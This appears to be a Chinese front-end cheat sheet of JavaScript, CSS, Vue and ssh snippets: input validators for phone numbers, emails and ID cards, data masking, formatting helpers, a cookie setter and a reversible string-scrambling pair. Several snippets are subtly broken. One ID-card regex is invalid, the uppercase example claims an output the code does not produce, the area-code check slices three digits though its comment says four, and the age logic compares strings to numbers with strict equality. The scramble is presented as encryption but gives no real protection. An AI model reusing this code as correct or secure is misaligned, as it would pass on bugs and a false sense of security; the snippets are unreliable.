class="headerlink" title="字符串内容"></a>字符串内容</h2><h3 id="数字校验"><a href="#数字校验" class="headerlink" title="数字校验"></a>数字校验</h3><pre><code class="javascript">    const a = /[0-9]/.exec(Str) != null ? 1 : 0</code></pre><h3 id="字母校验"><a href="#字母校验" class="headerlink" title="字母校验"></a>字母校验</h3><pre><code class="javascript">    const a = /[a-zA-Z]/.exec(Str) != null ? 1 : 0</code></pre><h3 id="营业执照统一信用编码校验"><a href="#营业执照统一信用编码校验" class="headerlink" title="营业执照统一信用编码校验"></a>营业执照统一信用编码校验</h3><pre><code class="javascript">    const reg = /[0-9A-HJ-NPQRTUWXY]&#123;2&#125;\d&#123;6&#125;[0-9A-HJ-NPQRTUWXY]&#123;10&#125;/.exec(Str)</code></pre><h3 id="字节统计"><a href="#字节统计" class="headerlink" title="字节统计"></a>字节统计</h3><pre><code class="javascript">handleToCountStrLength(str) &#123;    let len = 0    for (let i = 0; i &lt; str.length; i++) &#123;         let c = str.charAt(i)        if (/^[\u0000-\u00ffA-Za-z1-9]+$/.test(c)) &#123;             len += 1        &#125; else &#123;             len += 2        &#125;     &#125;    return len&#125;</code></pre><h3 id="字符串转大写"><a href="#字符串转大写" class="headerlink" title="字符串转大写"></a>字符串转大写</h3><pre><code class="javascript">let str = &#39;abc&#39;str.toUpperCase()console.log(str) // ABC</code></pre><h3 id="键盘输入限制只有大写字母"><a href="#键盘输入限制只有大写字母" class="headerlink" title="键盘输入限制只有大写字母"></a>键盘输入限制只有大写字母</h3><pre><code class="javascript">//  @input=&#39;scope.row.accountNo = handleToCheckValFn(scope.row.accountNo)&#39;_handleToCheckValFn(val) &#123;    const regex = /^[A-Z]+$/ // 只填大写字母    // const regex = /^[0-9]+$/ // 只填数字    let tempStr = &#39;&#39;    for(let i in val) &#123;        if(regex.test(val[i])) &#123;            tempStr += val[i]        &#125;    &#125;    return tempStr&#125;</code></pre><h3 id="普通校验（手机号、邮箱、身份证号）"><a href="#普通校验（手机号、邮箱、身份证号）" class="headerlink" title="普通校验（手机号、邮箱、身份证号）"></a>普通校验（手机号、邮箱、身份证号）</h3><pre><code class="javascript">const validatePhone = (rule, value, callback = () =&gt; &#123;&#125;) =&gt; &#123;    if(!value) &#123;        return callback(new Error(&#39;手机号码不能为空！&#39;))    &#125;    if(!/^1[3456789]\d&#123;9&#125;$/.test(value)) &#123;        return callback(new Error(&#39;手机号码不正确！&#39;))    &#125;    return callback()&#125;const validateEmial = (rule, value, callback = () =&gt; &#123;&#125;) =&gt; &#123;    if(!value) &#123;        return callback(new Error(&#39;邮箱不能为空！&#39;))    &#125;    if(!/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/.test(value)) &#123;        return callback(new Error(&#39;邮箱格式不正确！&#39;))    &#125;    return callback()&#125;const validateIdCard = (rule, value, callback = () =&gt; &#123;&#125;) =&gt; &#123;    if(!value) &#123;        return callback(new Error(&#39;身份证号不能为空！&#39;))    &#125;    if(!/^[1-9]\d&#123;5&#125;(?:18|19|20|21|22)\d&#123;2&#125;(?:0[1-9]|10|11|12)(?:0[1-9]|[1-2]\d|30|31)\d&#123;3&#125;[$/.test(value)) &#123;        return callback(new Error(&#39;身份证号不正确！&#39;))    &#125;    return callback()&#125;</code></pre><h3 id="首字母大写"><a href="#首字母大写" class="headerlink" title="首字母大写"></a>首字母大写</h3><pre><code class="javascript">export function firstChartToUpperCase(str) &#123;    if (typeof str === &#39;string&#39;) &#123;        return str.charAt(0).toUpperCase() + str.substr(1)    &#125;    return str&#125;</code></pre><h3 id="字符串转驼峰"><a href="#字符串转驼峰" class="headerlink" title="字符串转驼峰"></a>字符串转驼峰</h3><pre><code class="javascript">export function stringTurnHump(str, symbol = &#39;-&#39;) &#123;    if (typeof str === &#39;string&#39;) &#123;        return str.split(symbol).map((value, index) =&gt; (index &gt; 0 ? firstChartToUpperCase(value) : value)).join(&#39;&#39;)    &#125;    return str&#125;</code></pre><h3 id="css字符串转JS对象"><a href="#css字符串转JS对象" class="headerlink" title="css字符串转JS对象"></a>css字符串转JS对象</h3><pre><code class="javascript">export function stringTurnObjectForCSS(cssString) &#123;    if (cssString) &#123;        return Object.fromEntries(cssString.split(&#39;;&#39;).map((value) =&gt; value.split(&#39;:&#39;).map((val, index) =&gt; (index === 0 ? stringTurnHump(val) : val))))    &#125;    return cssString&#125;</code></pre><h3 id="手机号脱敏"><a href="#手机号脱敏" class="headerlink" title="手机号脱敏"></a>手机号脱敏</h3><pre><code class="javascript">export function formatPhone(phoneNumber) &#123;    const result = checkPhoneNumber(phoneNumber)    if (result.success) &#123;        return phoneNumber.toString().replace(/(.&#123;4&#125;)(.&#123;4&#125;)(.&#123;3&#125;)/, &#39;$1****$3&#39;)    &#125;    return result.message&#125;</code></pre><h3 id="脱敏银行卡号"><a href="#脱敏银行卡号" class="headerlink" title="脱敏银行卡号"></a>脱敏银行卡号</h3><pre><code class="javascript">export function desensitizeBankCardNumber(cardNumber) &#123;    const str = String(cardNumber)    return str.substring(str.length - 4)&#125;</code></pre><h3 id="金额转换千分位格式"><a href="#金额转换千分位格式" class="headerlink" title="金额转换千分位格式"></a>金额转换千分位格式</h3><pre><code class="javascript">/** * 金额转换千分位格式 * @param money 需转换的金额 * @param fixedLength &#123;number|null&#125; 保留几位小数 false 不处理 * @returns &#123;string|*&#125; */export function convertThousandth(money, fixedLength = null) &#123;    if (isNaN(Number(money))) &#123;        return money    &#125;    let _money = Number(money).toString()    if (typeof fixedLength === &#39;number&#39; &amp;&amp; !isNaN(fixedLength)) &#123;        _money = toFixed(money, fixedLength)    &#125;    if (_money.indexOf(&#39;.&#39;) === -1) &#123;        return _money.replace(/\B(?=(?:\d&#123;3&#125;)+\b)/g, &#39;,&#39;)    &#125;    return _money.replace(/(\d)(?=(\d&#123;3&#125;)+\.)/g, &#39;$1,&#39;)&#125;</code></pre><h3 id="身份证号校验（号码-区号）"><a href="#身份证号校验（号码-区号）" class="headerlink" title="身份证号校验（号码+区号）"></a>身份证号校验（号码+区号）</h3><pre><code class="javascript">const areaCode = &#39;1100,1101,1102,1200,1201,1202,1300,1301,1302,1303,1304,1305,1306,1307,1308,1309,1310,1311,1400,1401,1402,1403,1404,1405,1406,1407,1408,1409,1410,1411,1500,1501,1502,1503,1504,1505,1506,1507,1508,1509,1522,1525,1526,1529,2100,2101,2102,2103,2104,2105,2106,2107,2108,2109,2110,2111,2112,2113,2114,2200,2201,2202,2203,2204,2205,2206,2207,2208,2224,2300,2301,2302,2303,2304,2305,2306,2307,2308,2309,2310,2311,2312,2327,3100,3101,3102,3200,3201,3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,3300,3301,3302,3303,3304,3305,3306,3307,3308,3309,3310,3311,3400,3401,3402,3403,3404,3405,3406,3407,3408,3410,3411,3412,3413,3414,3415,3416,3417,3418,3500,3501,3502,3503,3504,3505,3506,3507,3508,3509,3600,3601,3602,3603,3604,3605,3606,3607,3608,3609,3610,3611,3700,3701,3702,3703,3704,3705,3706,3707,3708,3709,3710,3711,3712,3713,3714,3715,3716,3717,4100,4101,4102,4103,4104,4105,4106,4107,4108,4109,4110,4111,4112,4113,4114,4115,4116,4117,4200,4201,4202,4203,4205,4206,4207,4208,4209,4210,4211,4212,4213,4228,4290,4300,4301,4302,4303,4304,4305,4306,4307,4308,4309,4310,4311,4312,4313,4331,4400,4401,4402,4403,4404,4405,4406,4407,4408,4409,4412,4413,4414,4415,4416,4417,4418,4419,4420,4451,4452,4453,4500,4501,4502,4503,4504,4505,4506,4507,4508,4509,4510,4511,4512,4513,4514,4600,4601,4602,4690,5000,5001,5002,5003,5100,5101,5103,5104,5105,5106,5107,5108,5109,5110,5111,5113,5114,5115,5116,5117,5118,5119,5120,5132,5133,5134,5200,5201,5202,5203,5204,5222,5223,5224,5226,5227,5300,5301,5303,5304,5305,5306,5307,5308,5309,5323,5325,5326,5328,5329,5331,5333,5334,5400,5401,5421,5422,5423,5424,5425,5426,6100,6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6200,6201,6202,6203,6204,6205,6206,6207,6208,6209,6210,6211,6226,6229,6230,6300,6301,6321,6322,6323,6325,6326,6327,6328,6400,6401,6402,6403,6404,6405,6500,6501,6502,6521,6522,6523,6527,6528,6529,6530,6531,6532,6540,6542,6543,6590,7100,8100,8200&#39;const validateIdCard = (rule, value, callback = () =&gt; &#123;&#125;) =&gt; &#123;    if(!value) &#123;        return callback(new Error(&#39;身份证号不能为空！&#39;))    &#125;    if(!/^[1-9]\d&#123;5&#125;(?:18|19|20|21|22)\d&#123;2&#125;(?:0[1-9]|10|11|12)(?:0[1-9]|[1-2]\d|30|31)\d&#123;3&#125;[\dX]$/.test(value)) &#123;        return callback(new Error(&#39;身份证号不正确！&#39;))    &#125;    // 前4位区号有效验证    if(!areaCode.includes(value.slice(0, 3))) &#123;        return callback(new Error(&#39;身份证号不正确！&#39;))    &#125;    return callback()&#125;</code></pre><h3 id="根据身份证号计算内容"><a href="#根据身份证号计算内容" class="headerlink" title="根据身份证号计算内容"></a>根据身份证号计算内容</h3><pre><code class="javascript">computeIdCardFn(IdCard, type) &#123;    if(!IdCard) &#123;        return &#39;&#39;    &#125;    if (type === 1) &#123;        // 获取出生日期        let birthday = IdCard.substring(6, 10) + &#39;-&#39; + IdCard.substring(10, 12) + &#39;-&#39; + IdCard.substring(12, 14)        return birthday    &#125;    if (type === 2) &#123;        let sex = &#39;&#39;        // 获取性别        if (parseInt(IdCard.substr(16, 1)) % 2 === 1) &#123;            sex = &#39;男&#39;        &#125;else &#123;            sex = &#39;女&#39;        &#125;        return sex    &#125;    if (type === 3) &#123;        // 获取年龄        let ageDate = new Date()        let month = ageDate.getMonth() + 1        let day = ageDate.getDate()        let age = ageDate.getFullYear() - IdCard.substring(6, 10) - 1        if (IdCard.substring(10, 12) &lt; month || IdCard.substring(10, 12) === month &amp;&amp; IdCard.substring(12, 14) &lt;= day) &#123;            age++        &#125;        if (age &lt;= 0) &#123;            age = 1        &#125;        return age    &#125;&#125;</code></pre><h2 id="数组内容"><a href="#数组内容" class="headerlink" title="数组内容"></a>数组内容</h2><h3 id="filter"><a href="#filter" class="headerlink" title="filter()"></a>filter()</h3><pre><code class="javascript">// 过滤let numArr = [0, 1, 2, 3, 4, 5, 6, 7]let res = numArr.filter(num =&gt; num &gt;= 5)console.log(res) // [5, 6, 7]</code></pre><h3 id="重复判断"><a href="#重复判断" class="headerlink" title="重复判断"></a>重复判断</h3><pre><code class="javascript">// 判断数组中是否有重复内容let tempArr = [1, 2, 2, 3]Array.from(new Set(tempArr)).length &lt; tempArr.length</code></pre><h3 id="数组内容移动"><a href="#数组内容移动" class="headerlink" title="数组内容移动"></a>数组内容移动</h3><pre><code class="javascript">// 上移this.tempArr[index] = this.tempArr.splice(index - 1, 1, this.tempArr[index])[0]// 下移this.tempArr[index] = this.tempArr.splice(index + 1, 1, this.tempArr[index])[0]</code></pre><h3 id="数组内容随机抽取（不重复）"><a href="#数组内容随机抽取（不重复）" class="headerlink" title="数组内容随机抽取（不重复）"></a>数组内容随机抽取（不重复）</h3><pre><code class="javascript">export const sample = (arr, count) =&gt; &#123;    const result = new Set()    while (result.size &lt; count) &#123;        const index = Math.floor(Math.random() * arr.length)        result.add(arr[index])    &#125;    return Array.from(result)&#125;</code></pre><h2 id="Css内容"><a href="#Css内容" class="headerlink" title="Css内容"></a>Css内容</h2><h3 id="线性渐变背景颜色"><a href="#线性渐变背景颜色" class="headerlink" title="线性渐变背景颜色"></a>线性渐变背景颜色</h3><pre><code class="css">/* css线性渐变背景颜色 */background: linear-gradient(to right , #ffce7b, #ff6609);</code></pre><h3 id="右上角三角标"><a href="#右上角三角标" class="headerlink" title="右上角三角标"></a>右上角三角标</h3><pre><code class="css">/* css右上角三角标 */background-image: linear-gradient(225deg, #f44336 20%, #00dd00 20%);</code></pre><h2 id="VUE"><a href="#VUE" class="headerlink" title="VUE"></a>VUE</h2><h3 id="加载自动触发元素点击事件"><a href="#加载自动触发元素点击事件" class="headerlink" title="加载自动触发元素点击事件"></a>加载自动触发元素点击事件</h3><pre><code class="javascript">directives: &#123;    trigger: &#123;        triggerFlag: false,        inserted(el,binging) &#123;            if(binging.def.triggerFlag) &#123;                return            &#125;            el.click()            binging.def.triggerFlag = true        &#125;    &#125;&#125;,methods: &#123;&#125;,</code></pre><h2 id="页面事件监听"><a href="#页面事件监听" class="headerlink" title="页面事件监听"></a>页面事件监听</h2><h3 id="监听离开"><a href="#监听离开" class="headerlink" title="监听离开"></a>监听离开</h3><pre><code class="javascript">fn() &#123;    // 离开时监听触发&#125;// PC端window.addEventListener(&#39;blur&#39;, this.fn)window.removeEventListener(&#39;blur&#39;, this.fn)// 移动端window.addEventListener(&#39;visibilitychange&#39;, this.fn)window.removeEventListener(&#39;visibilitychange&#39;, this.fn)</code></pre><h2 id="移动端Debug"><a href="#移动端Debug" class="headerlink" title="移动端Debug"></a>移动端Debug</h2><pre><code class="html">&lt;script src=&quot;https://unpkg.com/vconsole@latest/dist/vconsole.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;     // VConsole 默认会挂载到 `window.VConsole` 上    var vConsole = new window.VConsole();&lt;/script&gt;</code></pre><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h3><pre><code class="sh"># 生成公钥私钥配对$ ssh-keygen -t ed25519 -C &quot;邮箱&quot;# git基础信息设置$ git config --global user.name &quot;&quot;$ git config --global user.email &quot;&quot;</code></pre><h3 id="连接服务器"><a href="#连接服务器" class="headerlink" title="连接服务器"></a>连接服务器</h3><pre><code class="sh"># 密码直接连接$ ssh userName@ip# 通过密钥证书连接$ ssh -i certName.pem userName@ip# 查看证书安装列表$ ssh-add -l# 安装证书（苹果电脑可能存在文件权限问题，可加sudo来跑命令）$ ssh-add certName.pem</code></pre><h2 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h2><h3 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h3><hr><pre><code>. - 除换行符以外的所有字符。^ - 字符串开头。$ - 字符串结尾。\d, \w, \s - 匹配数字、字符、空格。\D, \W, \S - 匹配非数字、非字符、非空格。[abc] - 匹配 a、b 或 c 中的一个字母。[a-z] - 匹配 a 到 z 中的一个字母。[^abc] - 匹配除了 a、b 或 c 中的其他字母。aa|bb - 匹配 aa 或 bb。? - 0 次或 1 次匹配。* - 匹配 0 次或多次。+ - 匹配 1 次或多次。&#123;n&#125; - 匹配 n次。&#123;n, &#125; - 匹配 n次以上。&#123;m, n&#125; - 最少 m 次，最多 n 次匹配。(expr) - 捕获 expr 子模式,以 \1 使用它。(?:expr) - 忽略捕获的子模式。(?=expr) - 正向预查模式 expr。(?!expr) - 负向预查模式 expr。</code></pre><hr><h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><pre><code class="javascript">compileStr(code) &#123;    let c = String.fromCharCode(code.charCodeAt(0) + code.length)    for(let i = 1; i &lt; code.length; i++) &#123;        c += String.fromCharCode(code.charCodeAt(i) + code.charCodeAt(i - 1))    &#125;    return escape(c)&#125;</code></pre><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><pre><code class="javascript">unCompileStr(str) &#123;    const code = unescape(str)    let c = String.fromCharCode(code.charCodeAt(0) - code.length)    for(let i = 1; i &lt; code.length; i++) &#123;        c += String.fromCharCode(code.charCodeAt(i) - c.charCodeAt(i - 1))    &#125;    return c&#125;</code></pre><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><h3 id="设置cookie"><a href="#设置cookie" class="headerlink" title="设置cookie"></a>设置cookie</h3><pre><code class="javascript">setCookie(name, value, days) &#123;    let expires = &#39;&#39;    if (days) &#123;        const date = new Date()        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000))        expires = &#39;; expires=&#39; + date.toUTCString()    &#125;    document.cookie = name + &#39;=&#39; + (value || &#39;&#39;) + expires + &#39;; path=/&#39;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
